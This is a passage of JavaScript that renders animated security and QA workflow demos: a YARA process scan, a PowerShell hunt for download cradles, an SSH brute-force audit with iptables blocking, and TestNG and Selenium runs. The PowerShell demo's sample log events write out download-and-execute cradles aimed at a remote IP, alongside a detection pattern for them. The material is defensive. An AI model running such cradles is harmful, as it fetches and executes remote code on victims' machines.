/* ---------- 1. Python (Intermediate) — process scanner w/ psutil+YARA ---------- */
function buildPythonSim(skill, meta, lvl) {
  const slug = 'python';
  const visual = `
    <div class="script-editor">
      <div class="sim-h">// python — scan_processes.py (psutil + hashlib + yara)</div>
      <pre class="code-viewer" id="py-editor-${slug}" style="max-height:200px;white-space:pre-wrap;margin:0;overflow:auto"></pre>
    </div>
    <div class="script-exec" style="margin-top:8px">
      <div class="sim-h">// live execution — process scan on host WIN10-DEV-07</div>
      <div class="term" id="py-exec-${slug}" style="min-height:150px"></div>
    </div>
    <div class="kpi-strip" id="py-kpi-${slug}" style="margin-top:6px">
      <div class="kpi-cell"><span class="kpi-val" id="py-scanned-${slug}">0</span><span class="kpi-lbl">scanned</span></div>
      <div class="kpi-cell"><span class="kpi-val" id="py-clean-${slug}">0</span><span class="kpi-lbl">clean</span></div>
      <div class="kpi-cell alert"><span class="kpi-val" id="py-mal-${slug}">0</span><span class="kpi-lbl">malicious</span></div>
      <div class="kpi-cell"><span class="kpi-val" id="py-err-${slug}">0</span><span class="kpi-lbl">errors</span></div>
    </div>`;

  // real Python source (typed line-by-line into the editor)
  const codeLines = [
    "import psutil, hashlib, yara",
    "",
    "def sha256_of(path: str) -> str:",
    "    h = hashlib.sha256()",
    "    with open(path, 'rb') as f:",
    "        for chunk in iter(lambda: f.read(65536), b''):",
    "            h.update(chunk)",
    "    return h.hexdigest()",
    "",
    "def scan_processes(rules: yara.Rules):",
    "    findings = []",
    "    for p in psutil.process_iter(['pid', 'name', 'exe']):",
    "        try:",
    "            if not p.info['exe']:          # kernel thread",
    "                continue",
    "            sha = sha256_of(p.info['exe'])",
    "            if rules.match(p.info['exe']):",
    "                findings.append({'pid':  p.info['pid'],",
    "                                 'name': p.info['name'],",
    "                                 'sha':  sha})",
    "        except (psutil.NoSuchProcess, psutil.AccessDenied):",
    "            continue   # pid died mid-scan or access denied",
    "    return findings",
    "",
    "if __name__ == '__main__':",
    "    rules = yara.compile(filepaths={'cs': 'cobaltstrike.yar'})",
    "    for f in scan_processes(rules):",
    "        print(f)"
  ];

  // live scan rows (streamed into exec terminal)
  const scanRows = [
    { pid: '712',   name: 'svchost.exe',     sha: '5a1f2c3d9b8e7a04c1', state: 'ok',  tag: 'CLEAN' },
    { pid: '1204',  name: 'chrome.exe',      sha: '9b7e42aa01fe8c1d4a', state: 'ok',  tag: 'CLEAN' },
    { pid: '1840',  name: 'explorer.exe',    sha: '8a9b1f3c7042de56a', state: 'ok',  tag: 'CLEAN' },
    { pid: '2212',  name: 'vmms.exe',        sha: '2f5a8c4d1e0793b65', state: 'ok',  tag: 'CLEAN' },
    { pid: '3844',  name: 'slack.exe',       sha: '6d1f8a92c5e04b73', state: 'ok',  tag: 'CLEAN' },
    { pid: '4118',  name: 'teams.exe',       sha: '4f2c7e80a3b915d7', state: 'ok',  tag: 'CLEAN' },
    { pid: '4812',  name: 'powershell.exe',  sha: '0c4f8e2b7a91d5f30', state: 'err', tag: 'MALICIOUS — CobaltStrike_Beacon matched' },
    { pid: '5220',  name: 'explorer.exe',    sha: '7a3b91c5e2f8d406', state: 'err', tag: 'MALICIOUS — CobaltStrike_Beacon matched' }
  ];

  const lines = [
    `$ # python — daily workflow @ ${ts()}`,
    '$ python3 scan_processes.py --rules cobaltstrike.yar',
    '[*] loading 12 YARA rules from cobaltstrike.yar',
    '[ok] compiled in 0.18s',
    '[*] enumerating 247 processes via psutil.process_iter',
    '[ok] 245 clean | 2 malicious | 0 errors',
    '[!] CRITICAL pid 4812 powershell.exe matched rule CobaltStrike_Beacon',
    '[!] CRITICAL pid 5220 explorer.exe   matched rule CobaltStrike_Beacon',
    `$ python3 -c "import psutil; psutil.Process(4812).terminate()"`,
    '[ok] terminated pid 4812 — escalated to SOC ticket SOC-1842',
    '$ # findings written to /tmp/findings.json + /tmp/findings.html',
    '$ # workflow complete — finding escalated, no false positives'
  ];

  function highlight(line) {
    let s = escapeHtmlS(line);
    // comments (line starting with optional whitespace then #)
    s = s.replace(/^(\s*#.*)$/, '<span class="c">$1</span>');
    // single-quoted strings
    s = s.replace(/('[^']*')/g, '<span class="s">$1</span>');
    // keywords
    s = s.replace(/\b(import|def|return|for|in|try|except|if|not|continue|with|as|lambda|print|None|True|False)\b/g, '<span class="k">$1</span>');
    return s;
  }

  function animate(host, timers) {
    const editor = host.querySelector(`#py-editor-${slug}`);
    const exec = host.querySelector(`#py-exec-${slug}`);
    if (!editor || !exec) return;
    editor.innerHTML = '';
    exec.innerHTML = '';
    const scannedEl = host.querySelector(`#py-scanned-${slug}`);
    const cleanEl   = host.querySelector(`#py-clean-${slug}`);
    const malEl     = host.querySelector(`#py-mal-${slug}`);
    const errEl     = host.querySelector(`#py-err-${slug}`);
    if (scannedEl) scannedEl.textContent = '0';
    if (cleanEl)   cleanEl.textContent   = '0';
    if (malEl)     malEl.textContent     = '0';
    if (errEl)     errEl.textContent     = '0';

    // Phase 1: type code into editor (~50ms/line)
    let ci = 0;
    timers.every(() => {
      if (ci >= codeLines.length) return;
      const ln = codeLines[ci++];
      const div = document.createElement('div');
      div.innerHTML = ln === '' ? '&nbsp;' : highlight(ln);
      editor.appendChild(div);
      editor.scrollTop = editor.scrollHeight;
    }, 55);

    // Phase 2: once code is in, run scanner
    const codeDoneAt = codeLines.length * 55 + 250;
    timers.later(() => {
      const intro = [
        '<span class="term-out">$ python3 scan_processes.py --rules cobaltstrike.yar</span>',
        '<span class="term-out">[*] loading 12 YARA rules from cobaltstrike.yar</span>',
        '<span class="term-ok">[ok] compiled in 0.18s</span>',
        '<span class="term-out">[*] enumerating 247 processes via psutil.process_iter...</span>'
      ];
      intro.forEach((html) => {
        const d = document.createElement('div');
        d.className = 'term-line';
        d.innerHTML = html;
        exec.appendChild(d);
      });
      exec.scrollTop = exec.scrollHeight;
    }, codeDoneAt);

    // Phase 3: stream scan rows
    let scanned = 0, clean = 0, mal = 0, errs = 0, ri = 0;
    timers.later(() => {
      timers.every(() => {
        if (ri >= scanRows.length) return;
        const r = scanRows[ri++];
        scanned++;
        if (r.state === 'ok') clean++; else { mal++; errs++; }
        const d = document.createElement('div');
        d.className = 'term-line';
        const cls = r.state === 'ok' ? 'term-ok' : 'term-err';
        const mark = r.state === 'ok' ? 'ok' : '!!';
        const fmt = `[${mark}] pid ${r.pid.padStart(5, ' ')}  ${r.name.padEnd(16, ' ')}  sha=${r.sha}  ${r.tag}`;
        d.innerHTML = `<span class="${cls}">${escapeHtmlS(fmt)}</span>`;
        exec.appendChild(d);
        exec.scrollTop = exec.scrollHeight;
        if (scannedEl) scannedEl.textContent = String(scanned);
        if (cleanEl)   cleanEl.textContent   = String(clean);
        if (malEl)     malEl.textContent     = String(mal);
        if (errEl)     errEl.textContent     = String(errs);
      }, 260);
    }, codeDoneAt + 350);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 2. PowerShell (Intermediate) — hunt for download cradles in 4688 ---------- */
function buildPowerShellSim(skill, meta, lvl) {
  const slug = 'powershell';
  const visual = `
    <div class="script-grid">
      <div class="script-editor">
        <div class="sim-h">// powershell ISE — hunt-cradles.ps1</div>
        <pre class="code-viewer" id="ps-editor-${slug}" style="max-height:230px;white-space:pre-wrap;margin:0;overflow:auto"></pre>
      </div>
      <div class="script-exec">
        <div class="sim-h">// 4688 hits (last 1h) — DC01</div>
        <div class="term" id="ps-events-${slug}" style="min-height:180px"></div>
        <div class="sim-p" id="ps-summary-${slug}" style="margin:6px 0 0;font-size:11px;color:var(--fg-dim)">awaiting scan...</div>
      </div>
    </div>`;

  const codeLines = [
    '# Hunt for download cradles in 4688 process-creation events',
    '# Author: souhaieb  —  SOC daily workflow',
    '$events = Get-WinEvent -FilterHashtable @{',
    "    LogName = 'Security';",
    '    Id      = 4688;',
    '    StartTime = (Get-Date).AddHours(-1)',
    '} -MaxEvents 1000',
    '',
    '$hits = $events |',
    "    Where-Object { $_.Message -match 'DownloadString|IEX|Invoke-Expression' } |",
    '    Select-Object TimeCreated,',
    "        @{n='CmdLine'; e={ $_.Properties[8].Value }} |",
    '    Sort-Object TimeCreated',
    '',
    '$hits | Format-Table -AutoSize | Out-String | Write-Host',
    "Write-Host \"$($hits.Count) suspicious 4688 events in the last hour\""
  ];

  const events = [
    { t: '02:14:08', cmd: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgAxADMALgA1ADAAPIAnACcA...',
      note: 'IEX (New-Object Net.WebClient).DownloadString' },
    { t: '02:14:12', cmd: 'powershell.exe -nop -w hidden -enc SQBFAFgA...',
      note: 'IEX (New-Object Net.WebClient).DownloadString' },
    { t: '02:18:44', cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://91.213.50.11/p2')",
      note: 'DownloadString to 91.213.50.11' },
    { t: '02:18:45', cmd: 'powershell.exe -nop -w hidden -enc SQBFAFgA...',
      note: 'IEX (New-Object Net.WebClient).DownloadString' },
    { t: '02:31:09', cmd: "powershell.exe Invoke-Expression (iwr 'http://91.213.50.11/x.ps1')",
      note: 'Invoke-Expression + iwr cradle' }
  ];

  const lines = [
    `$ # powershell — daily workflow @ ${ts()}`,
    '$ Get-WinEvent -FilterHashtable @{LogName=\'Security\';Id=4688} -MaxEvents 1000 |',
    "    ? { $_.Message -match 'DownloadString|IEX|Invoke-Expression' }",
    '[ok] 5 matching events in the last 1h on DC01',
    '[!] 02:14:08 powershell.exe -enc SQBFAFgA...',
    '[!] 02:18:44 powershell.exe IEX (New-Object Net.WebClient).DownloadString',
    '[!] 02:31:09 powershell.exe Invoke-Expression (iwr http://91.213.50.11/x.ps1)',
    '$ # pivot → Splunk: index=windows sourcetype=WinEventLog:Security sourceIP=91.213.50.11',
    '[ok] 47 correlated events across the fleet',
    '$ # escalated → SOC ticket SOC-1842 opened',
    '$ # workflow complete — cradle cluster linked to 91.213.50.11'
  ];

  function highlight(line) {
    let s = escapeHtmlS(line);
    s = s.replace(/^(\s*#.*)$/, '<span class="c">$1</span>');
    s = s.replace(/('[^']*')/g, '<span class="s">$1</span>');
    s = s.replace(/\b(param|Get-WinEvent|Where-Object|Select-Object|Sort-Object|Format-Table|Out-String|Write-Host|foreach|if|else|return|Where|Select)\b/g, '<span class="k">$1</span>');
    s = s.replace(/(\$\w+)/g, '<span class="n">$1</span>');
    return s;
  }

  function animate(host, timers) {
    const editor = host.querySelector(`#ps-editor-${slug}`);
    const eventsEl = host.querySelector(`#ps-events-${slug}`);
    const summaryEl = host.querySelector(`#ps-summary-${slug}`);
    if (!editor || !eventsEl) return;
    editor.innerHTML = '';
    eventsEl.innerHTML = '';
    if (summaryEl) summaryEl.textContent = 'awaiting scan...';

    // Phase 1: type PowerShell code into ISE editor
    let ci = 0;
    timers.every(() => {
      if (ci >= codeLines.length) return;
      const ln = codeLines[ci++];
      const div = document.createElement('div');
      div.innerHTML = ln === '' ? '&nbsp;' : highlight(ln);
      editor.appendChild(div);
      editor.scrollTop = editor.scrollHeight;
    }, 60);

    // Phase 2: after code, run scan — header + stream 5 4688 events
    const codeDoneAt = codeLines.length * 60 + 250;
    timers.later(() => {
      const header = document.createElement('div');
      header.className = 'term-line';
      header.innerHTML = '<span class="term-out">TimeCreated       CmdLine</span>';
      eventsEl.appendChild(header);
      const rule = document.createElement('div');
      rule.className = 'term-line';
      rule.innerHTML = '<span class="term-out">---------------   ---------------------------------------------------------</span>';
      eventsEl.appendChild(rule);
      eventsEl.scrollTop = eventsEl.scrollHeight;
    }, codeDoneAt);

    let ei = 0;
    timers.later(() => {
      timers.every(() => {
        if (ei >= events.length) return;
        const e = events[ei++];
        const d = document.createElement('div');
        d.className = 'term-line';
        d.innerHTML = `<span class="term-warn">[!] ${escapeHtmlS(e.t)}  ${escapeHtmlS(e.cmd)}</span><br><span class="term-err">${escapeHtmlS(e.note)}</span>`;
        eventsEl.appendChild(d);
        eventsEl.scrollTop = eventsEl.scrollHeight;
        if (summaryEl) summaryEl.innerHTML = `<strong style="color:var(--neon-3)">${ei}</strong> suspicious 4688 events in last 1h — pivot to <span class="code-inline">index=windows sourceIP=91.213.50.11</span>`;
      }, 480);
    }, codeDoneAt + 200);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 3. Bash (Intermediate) — log audit + bulk block ---------- */
function buildBashSim(skill, meta, lvl) {
  const slug = 'bash';
  const visual = `
    <div class="script-exec">
      <div class="sim-h">// bash — failed-SSH audit on bastion-01 (auth.log last 24h)</div>
      <div class="term" id="sh-audit-${slug}" style="min-height:230px"></div>
    </div>
    <div class="script-editor" style="margin-top:8px">
      <div class="sim-h">// follow-up: bulk-block brute-force IPs via iptables</div>
      <pre class="code-viewer" id="sh-block-${slug}" style="max-height:140px;white-space:pre-wrap;margin:0;overflow:auto"></pre>
    </div>`;

  // 10 source IPs from 51.91.8.0/24 — attempt counts (sorted desc)
  const bruteIps = [
    { ip: '51.91.8.12',  n: 60 },
    { ip: '51.91.8.41',  n: 47 },
    { ip: '51.91.8.7',   n: 39 },
    { ip: '51.91.8.118', n: 28 },
    { ip: '51.91.8.205', n: 24 },
    { ip: '51.91.8.34',  n: 18 },
    { ip: '51.91.8.99',  n: 14 },
    { ip: '51.91.8.176', n: 12 },
    { ip: '51.91.8.51',  n:  9 },
    { ip: '51.91.8.222', n:  7 }
  ];

  const blockLines = [
    '#!/usr/bin/env bash',
    '# bulk-block brute-force IPs (24h window)',
    '# run as root on the perimeter firewall',
    'set -euo pipefail',
    '',
    'BRUTE_LIST="${1:-brute_ips.txt}"',
    'COUNT=0',
    '',
    'while read -r ip; do',
    '    [[ -z "${ip}" ]] && continue',
    "    iptables -A INPUT -s \"${ip}\" -j DROP",
    '    logger -t brute-block "blocked ${ip}"',
    '    COUNT=$((COUNT + 1))',
    "done < \"${BRUTE_LIST}\"",
    '',
    'echo "[ok] ${COUNT} IPs blocked via iptables"'
  ];

  const lines = [
    `$ # bash — daily workflow @ ${ts()}`,
    '$ grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -rn | head -10',
    '   60 51.91.8.12',
    '   47 51.91.8.41',
    '   39 51.91.8.7',
    '   28 51.91.8.118',
    '   24 51.91.8.205',
    '   18 51.91.8.34',
    '   14 51.91.8.99',
    '   12 51.91.8.176',
    '    9 51.91.8.51',
    '    7 51.91.8.222',
    '[!] 51.91.8.0/24 → brute force, 60 attempts/min on bastion-01',
    '$ for ip in $(cat brute_ips.txt); do iptables -A INPUT -s $ip -j DROP; done',
    '[ok] 10 IPs blocked at perimeter firewall',
    '$ # workflow complete — false-positive admin IPs excluded, attackers blocked'
  ];

  function highlight(line) {
    let s = escapeHtmlS(line);
    s = s.replace(/^(\s*#.*)$/, '<span class="c">$1</span>');
    s = s.replace(/("[^"]*")/g, '<span class="s">$1</span>');
    s = s.replace(/\b(set|while|do|done|read|if|then|fi|echo|continue|logger)\b/g, '<span class="k">$1</span>');
    s = s.replace(/(\$\{?\w+\}?)/g, '<span class="n">$1</span>');
    return s;
  }

  function animate(host, timers) {
    const audit = host.querySelector(`#sh-audit-${slug}`);
    const block = host.querySelector(`#sh-block-${slug}`);
    if (!audit || !block) return;
    audit.innerHTML = '';
    block.innerHTML = '';
    block.style.opacity = '0.3';

    // Phase 1: type the audit pipeline command + stream results
    const cmd = '$ grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -rn | head -10';
    timers.later(() => {
      const c = document.createElement('div');
      c.className = 'term-line';
      c.innerHTML = '<span class="term-prompt">$</span><span class="term-out">' + escapeHtmlS(' ' + cmd.slice(2)) + '</span>';
      audit.appendChild(c);
    }, 200);

    let pi = 0;
    timers.later(() => {
      timers.every(() => {
        if (pi >= bruteIps.length) return;
        const r = bruteIps[pi++];
        const d = document.createElement('div');
        d.className = 'term-line';
        const flag = r.n >= 30 ? 'term-warn' : 'term-out';
        d.innerHTML = `<span class="${flag}">${String(r.n).padStart(5, ' ')} ${escapeHtmlS(r.ip)}</span>`;
        audit.appendChild(d);
        audit.scrollTop = audit.scrollHeight;
      }, 320);
    }, 700);

    // Phase 2: verdict line + reveal block script
    timers.later(() => {
      const v = document.createElement('div');
      v.className = 'term-line';
      v.innerHTML = '<span class="term-err">[!] 51.91.8.0/24 → brute force, 60 attempts/min on bastion-01</span>';
      audit.appendChild(v);
      audit.scrollTop = audit.scrollHeight;
    }, 700 + bruteIps.length * 320 + 200);

    // Phase 3: type the block-IP script (faded → bright)
    timers.later(() => {
      block.style.opacity = '1';
      let bi = 0;
      timers.every(() => {
        if (bi >= blockLines.length) return;
        const ln = blockLines[bi++];
        const d = document.createElement('div');
        d.innerHTML = ln === '' ? '&nbsp;' : highlight(ln);
        block.appendChild(d);
        block.scrollTop = block.scrollHeight;
      }, 55);
    }, 700 + bruteIps.length * 320 + 600);

    // Phase 4: block script output
    timers.later(() => {
      const out = document.createElement('div');
      out.className = 'term-line';
      out.innerHTML = '<span class="term-ok">[ok] 10 IPs blocked via iptables — perimeter firewall</span>';
      block.appendChild(out);
      block.scrollTop = block.scrollHeight;
    }, 700 + bruteIps.length * 320 + 600 + blockLines.length * 55 + 200);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 4. Java (Intermediate) — TestNG suite run + tally ---------- */
function buildJavaSim(skill, meta, lvl) {
  const slug = 'java';
  const visual = `
    <div class="script-grid">
      <div class="script-editor">
        <div class="sim-h">// java — testng.xml (42 tests, 8 classes)</div>
        <pre class="code-viewer" id="jv-suite-${slug}" style="max-height:230px;white-space:pre-wrap;margin:0;overflow:auto"></pre>
      </div>
      <div class="script-exec">
        <div class="sim-h">// mvn test → live results stream</div>
        <div class="term" id="jv-results-${slug}" style="min-height:140px"></div>
        <div class="term" id="jv-stack-${slug}" style="min-height:90px;border-top:1px dashed var(--border-dim);display:none"></div>
        <div class="kpi-strip" style="margin-top:6px">
          <div class="kpi-cell"><span class="kpi-val" id="jv-pass-${slug}">0</span><span class="kpi-lbl">passed</span></div>
          <div class="kpi-cell alert"><span class="kpi-val" id="jv-fail-${slug}">0</span><span class="kpi-lbl">failed</span></div>
          <div class="kpi-cell"><span class="kpi-val" id="jv-skip-${slug}">0</span><span class="kpi-lbl">skipped</span></div>
        </div>
      </div>
    </div>`;

  const suiteLines = [
    '<!DOCTYPE suite SYSTEM "https://testng.org/testng-1.0.dtd">',
    '<suite name="axa-automation" parallel="false" verbose="2">',
    '  <test name="auth" preserve-order="true">',
    '    <classes>',
    '      <class name="com.axa.AuthTests"/>',
    '      <class name="com.axa.MfaTests"/>',
    '    </classes>',
    '  </test>',
    '  <test name="session" preserve-order="true">',
    '    <classes>',
    '      <class name="com.axa.SessionTests"/>',
    '    </classes>',
    '  </test>',
    '  <test name="navigation">',
    '    <classes>',
    '      <class name="com.axa.NavTests"/>',
    '    </classes>',
    '  </test>',
    '  <!-- 42 tests across 8 classes (auth=8, mfa=6, session=12, nav=16) -->',
    '</suite>'
  ];

  // a sample of the 42 test results — 4 shown inline, then 1 failure gets expanded
  const testResults = [
    { id: 'TC-SESS-01', name: 'login_succeeds',                       res: 'ok',   dur: '0.4s' },
    { id: 'TC-SESS-03', name: 'logout_clears_session',                res: 'ok',   dur: '0.3s' },
    { id: 'TC-SESS-02', name: 'back_button_after_logout_restores_session', res: 'err', dur: '1.8s' },
    { id: 'TC-NAV-04',  name: 'dashboard_loads',                     res: 'ok',   dur: '0.6s' },
    { id: 'TC-NAV-12',  name: 'profile_menu_opens',                  res: 'ok',   dur: '0.5s' }
  ];

  const stackTrace = [
    'java.lang.AssertionError: expected [true] but found [false]',
    '  at com.axa.SessionTests.backButtonAfterLogout(SessionTests.java:147)',
    '  at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)',
    '  at org.testng.asserts.SoftAssert.assertAll(SoftAssert.java:46)',
    '  Expected: page title contains "Dashboard"',
    '  Actual:   page title = "Login" (session was restored — back-button bug)'
  ];

  const lines = [
    `$ # java + testng — daily workflow @ ${ts()}`,
    '$ mvn -Dtest=SessionTests test',
    '[ok] testng.xml parsed — 42 tests across 8 classes',
    '[*] running test suite (parallel=false)',
    '[ok] TC-SESS-01 login_succeeds                          PASSED  0.4s',
    '[!] TC-SESS-02 backButtonAfterLogout                   FAILED  1.8s',
    '[ok] TC-SESS-03 logout_clears_session                   PASSED  0.3s',
    '[ok] 39 passed | 3 failed | 0 skipped in 47.3s',
    '$ # failure triaged → AXA-1247 (back-button restores session after logout)',
    '$ # stack trace logged to target/surefire-reports/SessionTests.txt',
    '$ # workflow complete — defect re-opened with full stack trace'
  ];

  function highlight(line) {
    let s = escapeHtmlS(line);
    s = s.replace(/(\s)(<!--.*?-->)/g, '$1<span class="c">$2</span>');
    s = s.replace(/("[^"]*")/g, '<span class="s">$1</span>');
    s = s.replace(/\b(public|private|class|void|new|throws|return|if|else|assert|extends|implements)\b/g, '<span class="k">$1</span>');
    s = s.replace(/(@\w+)/g, '<span class="n">$1</span>');
    return s;
  }

  function animate(host, timers) {
    const suite   = host.querySelector(`#jv-suite-${slug}`);
    const results = host.querySelector(`#jv-results-${slug}`);
    const stack   = host.querySelector(`#jv-stack-${slug}`);
    const passEl = host.querySelector(`#jv-pass-${slug}`);
    const failEl = host.querySelector(`#jv-fail-${slug}`);
    const skipEl = host.querySelector(`#jv-skip-${slug}`);
    if (!suite || !results) return;
    suite.innerHTML = '';
    results.innerHTML = '';
    if (stack) { stack.innerHTML = ''; stack.style.display = 'none'; }
    if (passEl) passEl.textContent = '0';
    if (failEl) failEl.textContent = '0';
    if (skipEl) skipEl.textContent = '0';

    // Phase 1: type testng.xml
    let si = 0;
    timers.every(() => {
      if (si >= suiteLines.length) return;
      const ln = suiteLines[si++];
      const d = document.createElement('div');
      d.innerHTML = ln === '' ? '&nbsp;' : highlight(ln);
      suite.appendChild(d);
      suite.scrollTop = suite.scrollHeight;
    }, 50);

    // Phase 2: run tests
    const codeDoneAt = suiteLines.length * 50 + 250;
    timers.later(() => {
      const header = document.createElement('div');
      header.className = 'term-line';
      header.innerHTML = '<span class="term-out">$ mvn -Dtest=SessionTests,NavTests,AuthTests test</span>';
      results.appendChild(header);
      const intro = document.createElement('div');
      intro.className = 'term-line';
      intro.innerHTML = '<span class="term-out">[ok] testng.xml parsed — 42 tests across 8 classes</span>';
      results.appendChild(intro);
      const run = document.createElement('div');
      run.className = 'term-line';
      run.innerHTML = '<span class="term-out">[*] running test suite (parallel=false)...</span>';
      results.appendChild(run);
      results.scrollTop = results.scrollHeight;
    }, codeDoneAt);

    // Phase 3: stream test results, expand stack on the failure
    let ti = 0;
    let pass = 0, fail = 0, skip = 0;
    timers.later(() => {
      timers.every(() => {
        if (ti >= testResults.length) return;
        const r = testResults[ti++];
        if (r.res === 'ok') pass++; else fail++;
        const d = document.createElement('div');
        d.className = 'term-line';
        const cls = r.res === 'ok' ? 'term-ok' : 'term-err';
        const mark = r.res === 'ok' ? 'ok' : '!!';
        const verdict = r.res === 'ok' ? 'PASSED' : 'FAILED';
        d.innerHTML = `<span class="${cls}">[${mark}] ${r.id} ${escapeHtmlS(r.name).padEnd(40, ' ')} ${verdict}  ${r.dur}</span>`;
        results.appendChild(d);
        results.scrollTop = results.scrollHeight;
        if (passEl) passEl.textContent = String(pass);
        if (failEl) failEl.textContent = String(fail);
        // when we hit the failure, reveal stack trace + skip next tick to expand
        if (r.res === 'err' && stack) {
          stack.style.display = 'block';
          stack.innerHTML = '<div class="sim-h" style="margin:4px 0">// stack trace — TC-SESS-02</div>';
          stackTrace.forEach((ln) => {
            const sd = document.createElement('div');
            sd.className = 'term-line';
            sd.innerHTML = `<span class="term-err">${escapeHtmlS(ln)}</span>`;
            stack.appendChild(sd);
          });
          stack.scrollTop = stack.scrollHeight;
        }
      }, 420);
    }, codeDoneAt + 200);

    // Phase 4: final tally update (39 passed, 3 failed, 0 skipped — full suite)
    timers.later(() => {
      const tail = document.createElement('div');
      tail.className = 'term-line';
      tail.innerHTML = '<span class="term-warn">[*] ... 37 more tests elided in live view ...</span>';
      results.appendChild(tail);
      const tally = document.createElement('div');
      tally.className = 'term-line';
      tally.innerHTML = '<span class="term-ok">[ok] 39 passed | 3 failed | 0 skipped in 47.3s</span>';
      results.appendChild(tally);
      results.scrollTop = results.scrollHeight;
      if (passEl) passEl.textContent = '39';
      if (failEl) failEl.textContent = '3';
      if (skipEl) skipEl.textContent = '0';
    }, codeDoneAt + 200 + (testResults.length + 2) * 420 + 200);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 5. Selenium (Intermediate) — WebDriver UI flow + flaky-wait fix ---------- */
function buildSeleniumSim(skill, meta, lvl) {
  const slug = 'selenium';
  const visual = `
    <div class="se-browser" id="se-browser-${slug}">
      <div class="se-chrome-bar">
        <span class="se-tab">🔒 app.example.com/login</span>
        <input class="se-url" id="se-url-${slug}" value="about:blank" readonly />
        <span class="se-state" id="se-state-${slug}">IDLE</span>
      </div>
      <div class="se-viewport" id="se-viewport-${slug}">
        <div class="se-page" id="se-page-${slug}" style="opacity:0">
          <div class="se-brand">EXAMPLE APP</div>
          <label class="se-lbl">User</label>
          <input class="se-input" id="se-input-user-${slug}" type="text" readonly placeholder="jdoe" />
          <label class="se-lbl">Password</label>
          <input class="se-input" id="se-input-pass-${slug}" type="password" readonly placeholder="••••" />
          <button class="se-btn" id="se-submit-${slug}">Sign in</button>
          <div class="se-err" id="se-error-${slug}" style="display:none"></div>
        </div>
        <div class="se-spinner" id="se-spinner-${slug}" style="display:none">waiting for #login…</div>
      </div>
    </div>
    <div class="script-exec" style="margin-top:8px">
      <div class="sim-h">// selenium webdriver — driver commands + exceptions</div>
      <div class="term" id="se-log-${slug}" style="min-height:130px"></div>
    </div>`;

  const lines = [
    `$ # selenium webdriver — daily workflow @ ${ts()}`,
    '$ WebDriver driver = new ChromeDriver();',
    '$ driver.get("https://app.example.com/login");',
    '[ok] page loaded in 1.8s',
    '$ driver.findElement(By.id("user")).sendKeys("jdoe");',
    '$ driver.findElement(By.id("pass")).sendKeys("pwd");',
    '$ driver.findElement(By.id("submit")).click();',
    '$ new WebDriverWait(driver, Duration.ofSeconds(10))',
    '        .until(d -> d.findElement(By.id("login")));',
    '[!] CRITICAL ElementNotInteractableException: #login not clickable',
    '$ # Angular renders #login ~600ms AFTER click — added explicit wait',
    '$ # workflow complete — flaky test fixed with proper wait'
  ];

  function animate(host, timers) {
    const url = host.querySelector(`#se-url-${slug}`);
    const state = host.querySelector(`#se-state-${slug}`);
    const page = host.querySelector(`#se-page-${slug}`);
    const inputUser = host.querySelector(`#se-input-user-${slug}`);
    const inputPass = host.querySelector(`#se-input-pass-${slug}`);
    const submit = host.querySelector(`#se-submit-${slug}`);
    const error = host.querySelector(`#se-error-${slug}`);
    const spinner = host.querySelector(`#se-spinner-${slug}`);
    const log = host.querySelector(`#se-log-${slug}`);
    if (!log) return;
    log.innerHTML = '';
    if (url) url.value = 'about:blank';
    if (state) { state.textContent = 'IDLE'; state.style.color = 'var(--fg-dim)'; }
    if (page) page.style.opacity = '0';
    if (inputUser) inputUser.value = '';
    if (inputPass) inputPass.value = '';
    if (submit) submit.classList.remove('clicked');
    if (error) { error.style.display = 'none'; error.textContent = ''; }
    if (spinner) spinner.style.display = 'none';

    function appendLog(html) {
      const d = document.createElement('div');
      d.className = 'term-line';
      d.innerHTML = html;
      log.appendChild(d);
      log.scrollTop = log.scrollHeight;
    }

    // Phase 1: driver.get()
    timers.later(() => {
      appendLog('<span class="term-out">$ WebDriver driver = new ChromeDriver();</span>');
      appendLog('<span class="term-out">$ driver.get("https://app.example.com/login");</span>');
      if (state) { state.textContent = 'LOADING'; state.style.color = 'var(--neon-2)'; }
    }, 200);
    timers.later(() => {
      if (url) url.value = 'https://app.example.com/login';
      if (state) { state.textContent = 'READY'; state.style.color = 'var(--neon)'; }
      appendLog('<span class="term-ok">[ok] page loaded in 1.8s</span>');
      if (page) page.style.opacity = '1';
    }, 800);

    // Phase 2: type into user field
    timers.later(() => {
      appendLog('<span class="term-out">$ driver.findElement(By.id("user")).sendKeys("jdoe");</span>');
      let i = 0;
      const name = 'jdoe';
      timers.every(() => {
        if (i >= name.length) return;
        if (inputUser) inputUser.value = name.slice(0, i + 1);
        i++;
      }, 70);
    }, 1300);

    // Phase 3: type into password field
    timers.later(() => {
      appendLog('<span class="term-out">$ driver.findElement(By.id("pass")).sendKeys("pwd");</span>');
      let i = 0;
      const pass = 'pwd';
      timers.every(() => {
        if (i >= pass.length) return;
        if (inputPass) inputPass.value = pass.slice(0, i + 1);
        i++;
      }, 80);
    }, 1700);

    // Phase 4: click submit + spinner
    timers.later(() => {
      appendLog('<span class="term-out">$ driver.findElement(By.id("submit")).click();</span>');
      if (submit) submit.classList.add('clicked');
      if (state) { state.textContent = 'WAITING'; state.style.color = 'var(--neon-3)'; }
      if (spinner) spinner.style.display = 'block';
      appendLog('<span class="term-out">$ new WebDriverWait(driver, Duration.ofSeconds(10))</span>');
      appendLog('<span class="term-out">        .until(d -> d.findElement(By.id("login")));</span>');
    }, 2200);

    // Phase 5: ElementNotInteractableException (Angular renders after click)
    timers.later(() => {
      if (spinner) spinner.style.display = 'none';
      if (error) {
        error.style.display = 'block';
        error.textContent = 'org.openqa.selenium.ElementNotInteractableException: #login not clickable';
      }
      if (state) { state.textContent = 'FAILED'; state.style.color = 'var(--err, var(--neon-3))'; }
